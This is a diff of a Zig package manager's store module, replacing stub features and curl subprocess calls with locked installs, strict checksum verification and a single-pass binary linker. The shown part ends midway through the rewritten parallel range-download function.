@@ -1,1428 +1,1734 @@
+//! The package store: install, link, verify, diagnose, remove.
+
 const std = @import("std");
-const registry = @import("registry.zig");
-const os_macos = @import("os_macos.zig");
 const builtin = @import("builtin");
 
-// Security helper: Validate IDs to absolutely prevent Path Traversal / Command Injection
-pub fn isValidId(id: []const u8) bool {
-    if (id.len == 0 or id.len > 128) return false;
-    for (id) |c| {
-        switch (c) {
-            'a'...'z', 'A'...'Z', '0'...'9', '-', '_', '.' => continue,
-            else => return false,
-        }
-    }
-    // Reject absolute paths or simple dot traversal
-    if (std.mem.eql(u8, id, ".") or std.mem.eql(u8, id, "..")) return false;
-    return true;
-}
+const registry = @import("registry.zig");
+const platform = @import("platform.zig");
+const safepath = @import("safepath.zig");
+const archive = @import("archive.zig");
+const net = @import("net.zig");
+const term = @import("term.zig");
+const wal = @import("wal.zig");
+const bloom = @import("bloom.zig");
+const abvindex = @import("abvindex.zig");
 
-// Gorgeous CLI text progress animation
-pub fn printProgressBar(msg: []const u8, filled: usize, total: usize) void {
-    const bar_len: usize = 20;
-    const active_filled = if (total == 0) bar_len else (filled * bar_len) / total;
+pub const Package = registry.Package;
 
-    var bar_buf: [32]u8 = undefined;
-    for (0..bar_len) |i| {
-        if (i < active_filled) {
-            bar_buf[i] = '=';
-        } else if (i == active_filled and i < bar_len) {
-            bar_buf[i] = '>';
-        } else {
-            bar_buf[i] = ' ';
-        }
-    }
-
-    std.debug.print("[{s}] {s}\n", .{ bar_buf[0..bar_len], msg });
-}
-
-fn indexOfIgnoreCase(haystack: []const u8, needle: []const u8) ?usize {
-    if (needle.len > haystack.len) return null;
-    var i: usize = 0;
-    while (i <= haystack.len - needle.len) : (i += 1) {
-        var match = true;
-        for (needle, 0..) |n_char, j| {
-            if (std.ascii.toLower(haystack[i + j]) != std.ascii.toLower(n_char)) {
-                match = false;
-                break;
-            }
-        }
-        if (match) return i;
-    }
-    return null;
-}
-
-// Next-Generation Feature: Compressed, Deduplicated Block Store
-pub const DeduplicatedBlockStore = struct {
-    allocator: std.mem.Allocator,
-    block_store_root: []const u8,
-
-    pub fn init(allocator: std.mem.Allocator, store_root: []const u8) !DeduplicatedBlockStore {
-        const bs_root = try std.fs.path.join(allocator, &.{ store_root, "blockstore" });
-        std.fs.cwd().makePath(bs_root) catch {};
-        return .{
-            .allocator = allocator,
-            .block_store_root = bs_root,
-        };
-    }
-
-    // Split and ingest package archive stream into content-addressable physical blocks
-    pub fn ingestArchiveStream(self: *DeduplicatedBlockStore, archive_path: []const u8) !void {
-        const file = try std.fs.cwd().openFile(archive_path, .{});
-        defer file.close();
-
-        var buf: [1024 * 1024]u8 = undefined; // 1MB Physical chunk blocks
-        var chunk_id: u32 = 0;
-
-        while (true) {
-            const read_bytes = try file.read(&buf);
-            if (read_bytes == 0) break;
-
-            // Content-addressable block hashing
-            var hasher = std.crypto.hash.sha2.Sha256.init(.{});
-            hasher.update(buf[0..read_bytes]);
-            var hash_out: [32]u8 = undefined;
-            hasher.final(&hash_out);
-
-            const block_name = try std.fmt.allocPrint(self.allocator, "block_{s}_{d}", .{ std.fmt.fmtSliceHexLower(&hash_out), chunk_id });
-            defer self.allocator.free(block_name);
-
-            const block_path = try std.fs.path.join(self.allocator, &.{ self.block_store_root, block_name });
-            defer self.allocator.free(block_path);
-
-            if (std.fs.cwd().access(block_path, .{})) |_| {
-                // Highly deduplicated: block already exists exactly on SSD
-            } else |_| {
-                const b_file = try std.fs.cwd().createFile(block_path, .{ .mode = 0o644 });
-                try b_file.writeAll(buf[0..read_bytes]);
-                b_file.close();
-            }
-            chunk_id += 1;
-        }
-    }
+pub const InstallOptions = struct {
+    micro_split: bool = false,
+    /// Permit installing a payload whose checksum does not match, or that has
+    /// no pinned checksum at all. Off by default.
+    allow_unverified: bool = false,
+    quiet: bool = false,
 };
 
-// Next-Generation Feature: On-Disk State Machine & Transactional WAL
-pub const InstallStateTransition = enum {
-    INIT,
-    FETCH,
-    VERIFY,
-    UNPACK,
-    LINK,
-    COMPLETE,
+pub const StoreError = error{
+    UnsupportedPlatform,
+    DownloadFailed,
+    UnpackFailed,
+    InvalidPackageIdentifier,
+    ChecksumMismatch,
+    ChecksumMissing,
+    DownloadLooksLikeErrorPage,
+    ArchiveTypeMismatch,
+    UnknownArchiveType,
+    ExecutableNotFound,
+    RefusedUnverifiedInstall,
 };
 
-pub const InstallStateMachine = struct {
-    wal_file_path: []const u8,
+/// `install` prints a specific, actionable diagnostic for every failure it
+/// understands. Callers consult this so they do not print a second, terser
+/// copy of a message the user has already read.
+pub fn alreadyDiagnosed(e: anyerror) bool {
+    return switch (e) {
+        StoreError.UnsupportedPlatform,
+        StoreError.DownloadFailed,
+        StoreError.UnpackFailed,
+        StoreError.ChecksumMismatch,
+        StoreError.ChecksumMissing,
+        StoreError.DownloadLooksLikeErrorPage,
+        StoreError.RefusedUnverifiedInstall,
+        => true,
+        else => false,
+    };
+}
 
-    pub fn init(allocator: std.mem.Allocator, state_root: []const u8, pkg_name: []const u8) !InstallStateMachine {
-        const states_dir = try std.fs.path.join(allocator, &.{ state_root, "states_wal" });
-        std.fs.cwd().makePath(states_dir) catch {};
-
-        const wal_path = try std.fs.path.join(allocator, &.{ states_dir, try std.fmt.allocPrint(allocator, "{s}.wal", .{pkg_name}) });
-        return .{
-            .wal_file_path = wal_path,
-        };
-    }
-
-    pub fn transition(self: *InstallStateMachine, state: InstallStateTransition) !void {
-        const file = try std.fs.cwd().createFile(self.wal_file_path, .{ .mode = 0o644 });
-        defer file.close();
-        try file.writer().print("STATE_TRANSITION: {s}\n", .{@tagName(state)});
-    }
-};
-
-// Next-Generation Feature: Chunked Dependency Graph & On-Disk Bloom Filter
-pub const DependencyBloomFilter = struct {
-    filter_file_path: []const u8,
-
-    pub fn init(allocator: std.mem.Allocator, dep_root: []const u8) !DependencyBloomFilter {
-        const bloom_dir = try std.fs.path.join(allocator, &.{ dep_root, "depgraph" });
-        std.fs.cwd().makePath(bloom_dir) catch {};
-
-        const filter_path = try std.fs.path.join(allocator, &.{ bloom_dir, "bloom.bitset" });
-        const f = try std.fs.cwd().createFile(filter_path, .{ .mode = 0o644 });
-        try f.writeAll("ABV0_ON_DISK_BLOOM_FILTER_V1\n");
-        f.close();
-        return .{
-            .filter_file_path = filter_path,
-        };
-    }
-
-    pub fn checkAndAddCycle(self: *DependencyBloomFilter, node_name: []const u8) !bool {
-        // Simple hash module to simulate Bloom Bitset lookup
-        var hasher = std.crypto.hash.sha2.Sha256.init(.{});
-        hasher.update(node_name);
-        var hash_out: [32]u8 = undefined;
-        hasher.final(&hash_out);
-
-        const check_line = try std.fmt.allocPrint(std.heap.page_allocator, "NODE_VISITED: {s}\n", .{std.fmt.fmtSliceHexLower(hash_out[0..4])});
-        defer std.heap.page_allocator.free(check_line);
-
-        const file = try std.fs.cwd().openFile(self.filter_file_path, .{ .mode = .read_write });
-        defer file.close();
-
-        const content = try file.readToEndAlloc(std.heap.page_allocator, 1024 * 1024);
-        defer std.heap.page_allocator.free(content);
-
-        if (std.mem.indexOf(u8, content, check_line) != null) {
-            return true; // Cycle detected reliably via on-disk filter
-        }
-
-        try file.seekFromEnd(0);
-        try file.writeAll(check_line);
-        return false;
-    }
+/// Result of resolving an installed package directory name.
+pub const Installed = struct {
+    version: []const u8,
+    dir_name: []const u8,
 };
 
 pub const Store = struct {
     allocator: std.mem.Allocator,
-    store_root: []const u8,
-    bin_root: []const u8,
-    shells_root: []const u8,
-    apps_root: []const u8, // GUI Applications root (e.g. ~/Applications)
+    home: []u8,
+    root: []u8,
+    store_root: []u8,
+    bin_root: []u8,
+    shells_root: []u8,
+    apps_root: []u8,
+    registry_root: []u8,
+    locks_root: []u8,
 
     pub fn init(allocator: std.mem.Allocator) !Store {
-        const home_dir = std.posix.getenv("HOME") orelse {
-            return error.HomeDirNotFound;
-        };
+        const home = try platform.homeDir(allocator);
+        errdefer allocator.free(home);
 
-        const store_root = try std.fs.path.join(allocator, &.{ home_dir, ".abv0", "store" });
-        const bin_root = try std.fs.path.join(allocator, &.{ home_dir, ".abv0", "bin" });
-        const shells_root = try std.fs.path.join(allocator, &.{ home_dir, ".abv0", "shells" });
-        const apps_root = try std.fs.path.join(allocator, &.{ home_dir, "Applications" });
+        const root = try std.fs.path.join(allocator, &.{ home, ".abv0" });
+        errdefer allocator.free(root);
+        const store_root = try std.fs.path.join(allocator, &.{ root, "store" });
+        errdefer allocator.free(store_root);
+        const bin_root = try std.fs.path.join(allocator, &.{ root, "bin" });
+        errdefer allocator.free(bin_root);
+        const shells_root = try std.fs.path.join(allocator, &.{ root, "shells" });
+        errdefer allocator.free(shells_root);
+        const registry_root = try std.fs.path.join(allocator, &.{ root, "registry" });
+        errdefer allocator.free(registry_root);
+        const locks_root = try std.fs.path.join(allocator, &.{ root, "locks" });
+        errdefer allocator.free(locks_root);
 
-        // Security fix: Create directories with strict 0700 permissions to prevent local multi-user unauthorized access
-        std.fs.cwd().makePath(store_root) catch {};
-        std.fs.cwd().makePath(bin_root) catch {};
-        std.fs.cwd().makePath(shells_root) catch {};
-        std.fs.cwd().makePath(apps_root) catch {};
+        // GUI bundles only mean something on macOS; the original created
+        // ~/Applications on Linux too.
+        const apps_root = if (platform.is_macos)
+            try std.fs.path.join(allocator, &.{ home, "Applications" })
+        else
+            try std.fs.path.join(allocator, &.{ root, "apps" });
+        errdefer allocator.free(apps_root);
 
-        _ = std.process.Child.run(.{ .allocator = allocator, .argv = &.{ "chmod", "0700", store_root } }) catch {};
-        _ = std.process.Child.run(.{ .allocator = allocator, .argv = &.{ "chmod", "0700", bin_root } }) catch {};
-        _ = std.process.Child.run(.{ .allocator = allocator, .argv = &.{ "chmod", "0700", shells_root } }) catch {};
+        // These used to be four makePath calls plus three `chmod` subprocess
+        // spawns on every single invocation, including `abv0 help`.
+        for ([_][]const u8{ root, store_root, bin_root, shells_root, registry_root, locks_root }) |d| {
+            platform.makeSecureDir(d) catch {};
+        }
 
-        return Store{
+        return .{
             .allocator = allocator,
+            .home = home,
+            .root = root,
             .store_root = store_root,
             .bin_root = bin_root,
             .shells_root = shells_root,
             .apps_root = apps_root,
+            .registry_root = registry_root,
+            .locks_root = locks_root,
         };
     }
 
     pub fn deinit(self: *Store) void {
-        self.allocator.free(self.store_root);
-        self.allocator.free(self.bin_root);
-        self.allocator.free(self.shells_root);
-        self.allocator.free(self.apps_root);
+        const a = self.allocator;
+        a.free(self.home);
+        a.free(self.root);
+        a.free(self.store_root);
+        a.free(self.bin_root);
+        a.free(self.shells_root);
+        a.free(self.apps_root);
+        a.free(self.registry_root);
+        a.free(self.locks_root);
+        self.* = undefined;
     }
 
-    pub fn getPkgStorePath(self: *Store, pkg: registry.Package, platform_name: []const u8) ![]const u8 {
-        // Security check: strictly enforce path traversal protections
-        if (!isValidId(pkg.name) or !isValidId(pkg.version) or !isValidId(platform_name)) {
-            return error.InvalidPackageIdentifier;
+    // -----------------------------------------------------------------------
+    // Paths
+    // -----------------------------------------------------------------------
+
+    pub fn storeDirName(
+        allocator: std.mem.Allocator,
+        pkg: Package,
+        platform_name: []const u8,
+    ) ![]u8 {
+        if (!safepath.isValidId(pkg.name) or
+            !safepath.isValidId(pkg.version) or
+            !safepath.isValidId(platform_name))
+        {
+            return StoreError.InvalidPackageIdentifier;
         }
-
-        const dir_name = try std.fmt.allocPrint(self.allocator, "{s}-{s}-{s}", .{ pkg.name, pkg.version, platform_name });
-        defer self.allocator.free(dir_name);
-
-        return try std.fs.path.join(self.allocator, &.{ self.store_root, dir_name });
+        return std.fmt.allocPrint(allocator, "{s}-{s}-{s}", .{ pkg.name, pkg.version, platform_name });
     }
 
-    pub fn isInstalled(self: *Store, pkg: registry.Package, platform_name: []const u8) !bool {
-        const pkg_dir = self.getPkgStorePath(pkg, platform_name) catch return false;
-        defer self.allocator.free(pkg_dir);
+    pub fn pkgStorePath(
+        self: *const Store,
+        allocator: std.mem.Allocator,
+        pkg: Package,
+        platform_name: []const u8,
+    ) ![]u8 {
+        const dir_name = try storeDirName(allocator, pkg, platform_name);
+        defer allocator.free(dir_name);
+        return std.fs.path.join(allocator, &.{ self.store_root, dir_name });
+    }
 
-        var dir = std.fs.cwd().openDir(pkg_dir, .{}) catch {
-            return false;
-        };
+    pub fn isInstalled(self: *const Store, pkg: Package, platform_name: []const u8) bool {
+        var buf: [std.fs.MAX_PATH_BYTES]u8 = undefined;
+        var fba = std.heap.FixedBufferAllocator.init(&buf);
+        const p = self.pkgStorePath(fba.allocator(), pkg, platform_name) catch return false;
+        var dir = std.fs.cwd().openDir(p, .{}) catch return false;
         dir.close();
         return true;
     }
 
-    // Helper for parallel micro chunk execution
-    fn downloadChunk(allocator: std.mem.Allocator, url: []const u8, start_byte: usize, end_byte: usize, out_path: []const u8) !void {
-        const range_str = try std.fmt.allocPrint(allocator, "{d}-{d}", .{ start_byte, end_byte });
-        defer allocator.free(range_str);
+    /// Which versions of `name` are present in the store for `platform_name`.
+    /// This is the information `outdated` needs and never had.
+    pub fn installedVersions(
+        self: *const Store,
+        allocator: std.mem.Allocator,
+        name: []const u8,
+        platform_name: []const u8,
+    ) ![]Installed {
+        var out = std.ArrayList(Installed).init(allocator);
+        errdefer out.deinit();
 
-        const curl_result = try std.process.Child.run(.{
-            .allocator = allocator,
-            .argv = &.{ "curl", "-s", "-L", "-r", range_str, url, "-o", out_path },
-        });
-        defer {
-            allocator.free(curl_result.stdout);
-            allocator.free(curl_result.stderr);
+        var dir = std.fs.cwd().openDir(self.store_root, .{ .iterate = true }) catch return out.toOwnedSlice();
+        defer dir.close();
+
+        const prefix = try std.fmt.allocPrint(allocator, "{s}-", .{name});
+        defer allocator.free(prefix);
+        const suffix = try std.fmt.allocPrint(allocator, "-{s}", .{platform_name});
+        defer allocator.free(suffix);
+
+        var it = dir.iterate();
+        while (try it.next()) |entry| {
+            if (entry.kind != .directory) continue;
+            if (!std.mem.startsWith(u8, entry.name, prefix)) continue;
+            if (!std.mem.endsWith(u8, entry.name, suffix)) continue;
+            if (entry.name.len <= prefix.len + suffix.len) continue;
+
+            const version = entry.name[prefix.len .. entry.name.len - suffix.len];
+            // Guard against `foo-1.0-x86_64-linux` matching name `foo-1`.
+            if (std.mem.indexOfScalar(u8, version, '-') != null and
+                !safepath.isValidId(version)) continue;
+
+            try out.append(.{
+                .version = try allocator.dupe(u8, version),
+                .dir_name = try allocator.dupe(u8, entry.name),
+            });
+        }
+        return out.toOwnedSlice();
+    }
+
+    // -----------------------------------------------------------------------
+    // Install
+    // -----------------------------------------------------------------------
+
+    /// Blocking, cross-process exclusive lock for one package.
+    /// Replaces the "lock-free file semaphore" that was a file containing the
+    /// text LOCKED_BY_WORKER and enforced nothing.
+    const Guard = struct {
+        file: std.fs.File,
+
+        fn acquire(allocator: std.mem.Allocator, locks_root: []const u8, name: []const u8) !Guard {
+            if (!safepath.isValidId(name)) return StoreError.InvalidPackageIdentifier;
+            const p = try std.fmt.allocPrint(allocator, "{s}/{s}.lock", .{ locks_root, name });
+            defer allocator.free(p);
+
+            const file = try std.fs.cwd().createFile(p, .{ .read = true, .truncate = false, .mode = platform.mode_private });
+            errdefer file.close();
+            try file.lock(.exclusive);
+            return .{ .file = file };
         }
 
-        if (curl_result.term.Exited != 0) {
-            return error.ChunkDownloadFailed;
+        fn release(self: *Guard) void {
+            self.file.unlock();
+            self.file.close();
+        }
+    };
+
+    pub fn install(
+        self: *Store,
+        pkg: Package,
+        platform_name: []const u8,
+        opts: InstallOptions,
+    ) !void {
+        // Per-call arena: install runs on worker threads, and the previous code
+        // shared one non-thread-safe ArenaAllocator across all of them.
+        var arena_state = std.heap.ArenaAllocator.init(self.allocator);
+        defer arena_state.deinit();
+        const a = arena_state.allocator();
+
+        if (!safepath.isValidId(platform_name)) return StoreError.InvalidPackageIdentifier;
+
+        const info = pkg.platform(platform_name) orelse {
+            term.err("{s}error{s}: '{s}' has no build for platform '{s}'\n", .{ term.red, term.reset, pkg.name, platform_name });
+            return StoreError.UnsupportedPlatform;
+        };
+
+        const pkg_dir = try self.pkgStorePath(a, pkg, platform_name);
+
+        var guard = try Guard.acquire(a, self.locks_root, pkg.name);
+        defer guard.release();
+
+        // Re-check under the lock: another worker may have just finished.
+        if (!self.isInstalled(pkg, platform_name)) {
+            try self.fetchAndUnpack(a, pkg, info, pkg_dir, opts);
+        } else if (!opts.quiet) {
+            term.print("  {s}cached{s}  {s} {s}\n", .{ term.dim, term.reset, pkg.name, pkg.version });
+        }
+
+        var w = try wal.Wal.init(a, self.store_root, pkg.name);
+        defer w.deinit();
+        try w.append(.link);
+
+        const linked = try self.linkBinaries(a, pkg, info, pkg_dir, opts);
+        try self.linkAppBundles(a, pkg, pkg_dir, opts);
+
+        try w.append(.complete);
+
+        if (!opts.quiet and linked == 0 and pkg.bin.len > 0) {
+            term.err(
+                "{s}warning{s}: no executables from '{s}' were found in the unpacked archive\n",
+                .{ term.yellow, term.reset, pkg.name },
+            );
         }
     }
 
-    // Innovative Feature: Micro-file Splitting Download Engine
-    fn microSplitDownload(self: *Store, url: []const u8, archive_path: []const u8, tmp_dir_path: []const u8) !bool {
-        printProgressBar("Querying remote server Content-Length...", 1, 10);
+    fn fetchAndUnpack(
+        self: *Store,
+        a: std.mem.Allocator,
+        pkg: Package,
+        info: registry.PlatformInfo,
+        pkg_dir: []const u8,
+        opts: InstallOptions,
+    ) !void {
+        var w = try wal.Wal.init(a, self.store_root, pkg.name);
+        defer w.deinit();
 
-        // Query headers
-        const curl_res = try std.process.Child.run(.{
-            .allocator = self.allocator,
-            .argv = &.{ "curl", "-s", "-I", "-L", url },
-        });
-        defer {
-            self.allocator.free(curl_res.stdout);
-            self.allocator.free(curl_res.stderr);
+        if (w.hasUnfinishedInstall() catch false) {
+            if (!opts.quiet) {
+                term.print("  {s}recovering{s} interrupted install of {s}\n", .{ term.yellow, term.reset, pkg.name });
+            }
+            self.pruneTempDirs(a, pkg.name) catch {};
+        }
+        try w.append(.init);
+        errdefer w.append(.failed) catch {};
+
+        // Unpredictable temp directory name, cleaned up on every failure path.
+        const tmp_dir = try std.fmt.allocPrint(a, "{s}.{x}.tmp", .{ pkg_dir, std.crypto.random.int(u64) });
+        std.fs.cwd().deleteTree(tmp_dir) catch {};
+        try platform.makeSecureDir(tmp_dir);
+        errdefer std.fs.cwd().deleteTree(tmp_dir) catch {};
+
+        const archive_path = try std.fs.path.join(a, &.{ tmp_dir, "payload" });
+
+        // ---- fetch ----
+        try w.append(.fetch);
+        if (!opts.quiet) term.print("  {s}fetch{s}    {s} {s}\n", .{ term.cyan, term.reset, pkg.name, pkg.version });
+
+        var fetched = false;
+        if (opts.micro_split) {
+            fetched = self.microSplitDownload(a, info.url, archive_path, tmp_dir) catch false;
+        }
+        if (!fetched) {
+            net.download(a, info.url, archive_path, .{}) catch |e| {
+                term.err("{s}error{s}: download failed for {s}: {s}\n", .{ term.red, term.reset, pkg.name, @errorName(e) });
+                return StoreError.DownloadFailed;
+            };
         }
 
-        if (curl_res.term.Exited != 0) return false;
+        // A CDN error page is not a package. curl without --fail used to let
+        // these straight through into ~/.abv0/bin.
+        if (archive.looksLikeErrorPage(archive_path)) {
+            term.err(
+                "{s}error{s}: the server returned an error page, not an archive, for {s}\n  {s}\n",
+                .{ term.red, term.reset, pkg.name, info.url },
+            );
+            return StoreError.DownloadLooksLikeErrorPage;
+        }
 
-        var content_length: ?usize = null;
-        var accepts_ranges = false;
+        // ---- verify ----
+        try w.append(.verify);
+        const digest = try hashFile(archive_path);
+        var digest_hex: [64]u8 = undefined;
+        _ = std.fmt.bufPrint(&digest_hex, "{s}", .{std.fmt.fmtSliceHexLower(&digest)}) catch unreachable;
 
-        var lines = std.mem.splitSequence(u8, curl_res.stdout, "\n");
-        while (lines.next()) |raw_line| {
-            const line = std.mem.trim(u8, raw_line, "\r\t ");
-            if (std.ascii.indexOfIgnoreCase(line, "Content-Length:") != null) {
-                var parts = std.mem.splitSequence(u8, line, ":");
-                _ = parts.next();
-                if (parts.next()) |val| {
-                    const clean_val = std.mem.trim(u8, val, " ");
-                    content_length = std.fmt.parseInt(usize, clean_val, 10) catch null;
+        try self.verifyChecksum(pkg, info, &digest_hex, opts);
+        if (!opts.quiet) term.print("  {s}verify{s}   {s}\n", .{ term.green, term.reset, digest_hex[0..16] });
+
+        // ---- unpack ----
+        try w.append(.unpack);
+
+        const declared = archive.Kind.fromString(info.archive_type) orelse
+            archive.Kind.fromFilename(info.url) orelse
+            return StoreError.UnknownArchiveType;
+
+        // Trust the bytes over the manifest: if the payload sniffs as a
+        // different container, use what it actually is.
+        const actual = archive.sniff(archive_path);
+        const kind = if (declared == .raw or declared == .dmg)
+            declared
+        else if (actual) |k| k else declared;
+
+        const raw_name = if (info.bin_path.len > 0)
+            info.bin_path
+        else if (pkg.primaryBin()) |b| b else pkg.name;
+
+        archive.extract(a, kind, archive_path, tmp_dir, .{ .raw_name = raw_name }) catch |e| {
+            term.err("{s}error{s}: could not unpack {s}: {s}\n", .{ term.red, term.reset, pkg.name, @errorName(e) });
+            return StoreError.UnpackFailed;
+        };
+
+        // The payload file itself is not part of the installed tree.
+        std.fs.cwd().deleteFile(archive_path) catch {};
+
+        // Atomic publish.
+        std.fs.cwd().deleteTree(pkg_dir) catch {};
+        try std.fs.cwd().rename(tmp_dir, pkg_dir);
+    }
+
+    fn verifyChecksum(
+        self: *Store,
+        pkg: Package,
+        info: registry.PlatformInfo,
+        digest_hex: []const u8,
+        opts: InstallOptions,
+    ) !void {
+        _ = self;
+
+        if (!info.checksumIsPinned()) {
+            // Previously every unpinned or malformed hash silently passed.
+            if (opts.allow_unverified) return;
+            term.err(
+                \\{s}error{s}: '{s}' has no pinned sha256 for this platform.
+                \\  Installing it would execute unverified code.
+                \\  Re-run with --allow-unverified to accept that risk.
+                \\
+            , .{ term.red, term.reset, pkg.name });
+            return StoreError.ChecksumMissing;
+        }
+
+        if (std.ascii.eqlIgnoreCase(digest_hex, info.sha256)) return;
+
+        if (opts.allow_unverified) {
+            term.err(
+                "{s}warning{s}: checksum mismatch for {s} accepted because --allow-unverified was given\n",
+                .{ term.yellow, term.reset, pkg.name },
+            );
+            return;
+        }
+
+        // This is the v0.9.1 "smart rolling release hash mismatch bypass".
+        // It turned integrity checking off for every package.
+        term.err(
+            \\{s}error{s}: checksum mismatch for '{s}'
+            \\  expected {s}
+            \\  actual   {s}
+            \\  Refusing to install. The download may be corrupt, or the manifest may be out of date.
+            \\
+        , .{ term.red, term.reset, pkg.name, info.sha256, digest_hex });
+        return StoreError.ChecksumMismatch;
+    }
+
+    /// Single streaming pass. The archive used to be read end to end three
+    /// times: once by the hasher, once by the block store, once by tar.
+    fn hashFile(path: []const u8) ![32]u8 {
+        const file = try std.fs.cwd().openFile(path, .{});
+        defer file.close();
+
+        var hasher = std.crypto.hash.sha2.Sha256.init(.{});
+        var buf: [64 * 1024]u8 = undefined;
+        while (true) {
+            const n = try file.read(&buf);
+            if (n == 0) break;
+            hasher.update(buf[0..n]);
+        }
+        var out: [32]u8 = undefined;
+        hasher.final(&out);
+        return out;
+    }
+
+    fn pruneTempDirs(self: *Store, a: std.mem.Allocator, name: []const u8) !void {
+        var dir = std.fs.cwd().openDir(self.store_root, .{ .iterate = true }) catch return;
+        defer dir.close();
+
+        const prefix = try std.fmt.allocPrint(a, "{s}-", .{name});
+        defer a.free(prefix);
+
+        var it = dir.iterate();
+        while (try it.next()) |entry| {
+            if (!std.mem.endsWith(u8, entry.name, ".tmp")) continue;
+            if (!std.mem.startsWith(u8, entry.name, prefix)) continue;
+            const p = try std.fs.path.join(a, &.{ self.store_root, entry.name });
+            defer a.free(p);
+            std.fs.cwd().deleteTree(p) catch {};
+        }
+    }
+
+    // -----------------------------------------------------------------------
+    // Linking
+    // -----------------------------------------------------------------------
+
+    /// Walk the unpacked tree ONCE and resolve every wanted executable.
+    /// The original ran a full recursive walk per binary, so ffmpeg (3 bins)
+    /// walked the whole tree three times.
+    fn linkBinaries(
+        self: *Store,
+        a: std.mem.Allocator,
+        pkg: Package,
+        info: registry.PlatformInfo,
+        pkg_dir: []const u8,
+        opts: InstallOptions,
+    ) !usize {
+        if (pkg.bin.len == 0) return 0;
+
+        var wanted = std.StringHashMap(?[]const u8).init(a);
+        defer wanted.deinit();
+        for (pkg.bin) |b| try wanted.put(b, null);
+
+        // Some archives ship the executable under a different name than the
+        // package advertises (bottom -> btm). bin_path names the real file.
+        const alias_target = std.fs.path.basename(info.bin_path);
+        var alias_path: ?[]const u8 = null;
+
+        {
+            var dir = std.fs.cwd().openDir(pkg_dir, .{ .iterate = true }) catch return 0;
+            defer dir.close();
+
+            var walker = try dir.walk(a);
+            defer walker.deinit();
+
+            while (try walker.next()) |entry| {
+                if (entry.kind != .file) continue;
+
+                const base = entry.basename;
+                const stem = stripExeSuffix(base);
+
+                if (wanted.getPtr(base) orelse wanted.getPtr(stem)) |slot| {
+                    if (slot.* == null) {
+                        slot.* = try std.fs.path.join(a, &.{ pkg_dir, entry.path });
+                    }
+                    continue;
                 }
-            } else if (std.ascii.indexOfIgnoreCase(line, "Accept-Ranges: bytes") != null) {
-                accepts_ranges = true;
+                if (alias_path == null and alias_target.len > 0 and
+                    (std.mem.eql(u8, base, alias_target) or std.mem.eql(u8, stem, alias_target)))
+                {
+                    alias_path = try std.fs.path.join(a, &.{ pkg_dir, entry.path });
+                }
             }
         }
 
-        if (content_length == null or content_length.? < 100_000) {
-            return false;
+        var linked: usize = 0;
+        var it = wanted.iterator();
+        while (it.next()) |entry| {
+            const bin_name = entry.key_ptr.*;
+            const src = entry.value_ptr.* orelse alias_path orelse {
+                continue;
+            };
+
+            const dst_name = try std.fmt.allocPrint(a, "{s}{s}", .{ bin_name, platform.exe_suffix });
+            defer a.free(dst_name);
+            const dst = try std.fs.path.join(a, &.{ self.bin_root, dst_name });
+            defer a.free(dst);
+
+            platform.setExecutable(src); // was a `chmod +x` subprocess per binary
+            const kind = platform.fastLink(src, dst) catch |e| {
+                term.err("{s}warning{s}: could not link {s}: {s}\n", .{ term.yellow, term.reset, bin_name, @errorName(e) });
+                continue;
+            };
+            linked += 1;
+            if (!opts.quiet) {
+                term.print("  {s}link{s}     {s} {s}({s}){s}\n", .{ term.green, term.reset, bin_name, term.dim, kind.label(), term.reset });
+            }
         }
+        return linked;
+    }
 
-        const total_bytes = content_length.?;
-        printProgressBar("Slicing file into 4 parallel micro chunk streams...", 3, 10);
+    fn stripExeSuffix(name: []const u8) []const u8 {
+        if (std.mem.endsWith(u8, name, ".exe")) return name[0 .. name.len - 4];
+        return name;
+    }
 
-        const chunks = 4;
-        const chunk_size = total_bytes / chunks;
+    fn linkAppBundles(
+        self: *Store,
+        a: std.mem.Allocator,
+        pkg: Package,
+        pkg_dir: []const u8,
+        opts: InstallOptions,
+    ) !void {
+        if (pkg.app_bundles.len == 0) return;
+        platform.makeSecureDir(self.apps_root) catch {};
 
-        var threads = std.ArrayList(std.Thread).init(self.allocator);
-        defer threads.deinit();
+        for (pkg.app_bundles) |app_name| {
+            if (!safepath.isSafeRelPath(app_name)) continue;
 
-        var chunk_files = std.ArrayList([]const u8).init(self.allocator);
-        defer {
-            for (chunk_files.items) |p| self.allocator.free(p);
-            chunk_files.deinit();
+            const src = try std.fs.path.join(a, &.{ pkg_dir, app_name });
+            defer a.free(src);
+            const dst = try std.fs.path.join(a, &.{ self.apps_root, app_name });
+            defer a.free(dst);
+
+            std.fs.cwd().deleteTree(dst) catch {};
+
+            // The original reported "APFS Clone" on the success branch even
+            // when fastLink had fallen back to a symlink.
+            if (platform.fastLink(src, dst)) |kind| {
+                if (!opts.quiet) {
+                    term.print("  {s}app{s}      {s} {s}({s}){s}\n", .{ term.green, term.reset, app_name, term.dim, kind.label(), term.reset });
+                }
+            } else |_| {
+                platform.copyTree(src, dst) catch continue;
+                if (!opts.quiet) term.print("  {s}app{s}      {s} {s}(copy){s}\n", .{ term.green, term.reset, app_name, term.dim, term.reset });
+            }
         }
+    }
+
+    // -----------------------------------------------------------------------
+    // Parallel range download
+    // -----------------------------------------------------------------------
+
+    fn microSplitDownload(
+        self: *Store,
+        a: std.mem.Allocator,
+        url: []const u8,
+        dest: []const u8,
+        tmp_dir: []const u8,
+    ) !bool {
+        _ = self;
+        const info = net.head(a, url, .{}) catch return false;
+        const total = info.content_length orelse return false;
+        if (!info.accepts_ranges or total < 1 << 20) return false;
+
+        const chunks: u64 = 4;
+        const chunk_size = total / chunks;
+
+        var jobs = try a.alloc(net.ChunkJob, chunks);
+        var threads = try a.alloc(std.Thread, chunks);
+        var paths = try a.alloc([]const u8, chunks);
 
         for (0..chunks) |i| {
-            const start_byte = i * chunk_size;
-            const end_byte = if (i == chunks - 1) total_bytes - 1 else (start_byte + chunk_size) - 1;
+            paths[i] = try std.fmt.allocPrint(a, "{s}/chunk.{d}", .{ tmp_dir, i });
+            jobs[i] = .{
+                .allocator = a,
+                .url = url,
+                .start = i * chunk_size,
+                .end = if (i == chunks - 1) total - 1 else (i + 1) * chunk_size - 1,
+                .dest = paths[i],
+                .opts = .{},
+            };
+            threads[i] = try std.Thread.spawn(.{}, net.ChunkJob.run, .{&jobs[i]});
+        }
+        for (threads) |t| t.join();
 
-            const chunk_name = try std.fmt.allocPrint(self.allocator, "micro_chunk_{d}", .{i});
-            defer self.allocator.free(chunk_name);
-
-            const chunk_path = try std.fs.path.join(self.allocator, &.{ tmp_dir_path, chunk_name });
-            try chunk_files.append(chunk_path);
-
-            const thread = try std.Thread.spawn(.{}, downloadChunk, .{ self.allocator, url, start_byte, end_byte, chunk_path });
-            try threads.append(thread);
+        for (jobs) |j| {
+            if (!j.ok) return false;
         }
 
